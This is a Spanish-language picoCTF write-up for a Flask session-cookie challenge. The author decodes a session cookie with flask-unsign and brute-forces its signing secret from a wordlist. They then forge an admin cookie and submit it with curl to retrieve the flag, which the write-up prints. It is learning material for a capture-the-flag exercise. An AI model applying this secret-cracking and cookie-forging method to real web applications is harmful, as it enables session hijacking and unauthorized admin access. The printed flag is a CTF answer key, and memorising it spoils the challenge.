## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
## Solución
- Instalamos y configuramos la herramienta pipx.
```bash
┌──(armando㉿kali)-[~]
└─$ sudo apt install pipx

...

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ pipx ensurepath
Success! Added /home/armando/.local/bin to the PATH environment variable.

Consider adding shell completions for pipx. Run 'pipx completions' for
instructions.

You will need to open a new terminal or re-login for the PATH changes to
take effect. Alternatively, you can source your shell's config file with
e.g. 'source ~/.bashrc'.

Otherwise pipx is ready to go! ✨ 🌟 ✨

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ source ~/.zshrc

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ 
```
- Descargamos la herramienta que vamos a utilizar `flask-unsign` y utilizamos la cookie que creamos como ejemplo.
```bash
┌──(armando㉿kali)-[~/picoCTFretos]
└─$ pipx install flask-unsign
  installed package flask-unsign 1.2.0, installed using Python 3.12.6
  These apps are now globally available
    - flask-unsign
done! ✨ 🌟 ✨

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvyqxA.5MIa-HH7JxZdmpSg8I_4Fw5azZo
{'very_auth': 'snickerdoodle'}

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ 
```
- Creamos un archivo con las cookies y la utilizamos con la cookie que tenemos para obtener la firma.
```bash
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvyqxA.5MIa-HH7JxZdmpSg8I_4Fw5azZo --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ 
```
- Finalmente creamos  una nueva cookie con el usuario de admin y con la llave que descubrimos y ya solo utilizamos la cookie que creamos en la pagina web para obtener la bandera.
```bash
┌──(armando㉿kali)-[~/picoCTFretos]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvyvMQ.eyjKKBPBTbNJpNHW25d6r6RlFqg

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ curl http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvyvMQ.eyjKKBPBTbNJpNHW25d6r6RlFqg" 

picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ 
```
## Notas Adicionales
## Referencias
- [ Flask - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)